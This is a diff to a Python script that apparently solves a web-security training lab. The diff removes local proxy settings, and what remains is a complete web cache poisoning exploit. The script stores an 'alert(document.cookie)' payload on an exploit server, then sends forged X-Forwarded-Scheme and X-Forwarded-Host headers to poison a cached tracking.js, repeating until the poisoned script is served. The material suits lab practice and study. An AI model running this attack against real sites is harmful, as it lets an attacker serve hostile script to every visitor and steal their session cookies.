@@ -12,7 +12,7 @@ class LabSolver:
         self.exploit_server_url = None
 
     def get_exploit_server_url(self):
-        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url)
         self.exploit_server_url = re.search(r'href=\'(https://exploit-.*?)\'', response.text).group(1)
 
     def store_payload_on_exploit_server(self):
@@ -23,22 +23,22 @@ class LabSolver:
             'responseBody': 'alert(document.cookie)',
             'formAction': 'STORE'
         }
-        self.session.post(self.exploit_server_url, data=data, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        self.session.post(self.exploit_server_url, data=data)
 
     def poison_home_page(self):
         headers = {
             'X-Forwarded-Scheme': 'http',
             'X-Forwarded-Host': self.exploit_server_url.replace('https://', '')
         }
-        response = self.session.get(self.lab_url + 'resources/js/tracking.js', headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url + 'resources/js/tracking.js', headers=headers)
         while True:
             if 'alert(document.cookie)' not in response.text:
-                response = self.session.get(self.lab_url + 'resources/js/tracking.js', headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+                response = self.session.get(self.lab_url + 'resources/js/tracking.js', headers=headers)
             else:
                 break
 
     def check_solution(self):
-        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url)
         if 'Congratulations, you solved the lab!' in response.text:
             print('You solved the lab.')
             print('Coded by Mohamed Ahmed (ma4747gh).')
